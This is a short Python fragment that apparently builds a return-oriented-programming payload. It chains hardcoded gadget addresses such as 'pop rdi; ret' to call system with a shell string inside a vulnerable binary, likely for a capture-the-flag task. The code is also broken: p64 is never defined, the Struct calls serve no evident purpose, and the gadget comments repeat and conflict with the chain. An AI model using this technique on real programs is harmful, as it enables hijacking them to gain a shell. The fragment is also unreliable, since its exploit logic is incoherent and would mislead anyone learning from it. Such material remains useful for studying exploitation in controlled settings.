from _struct import Struct
s = Struct.__new__(Struct)
s.__init__('>q')
s.pack(0x2000000000000000)

# 0x601060
system = 0x601060
shell = 0x601050

# copy to 0x601060
# 0x4008e3: mov rdi, rax; mov rsi, rdx; call qword ptr [r13 + 8*rbx]
# rax = 0x601060
# rbx = 1
# rdx = 0x601050
# r13 = 0x601050

# 0x40122a: pop rdi; ret
payload = (
    p64(0x40122a) +
    p64(0x601060) +
    p64(0x40122a) +
    p64(0x601050) +
    p64(0x4008e3)
)

# copy to 0x601050
# 0x4008e3: mov rdi, rax; mov rsi, rdx; call qword ptr [r13 + 8*rbx]
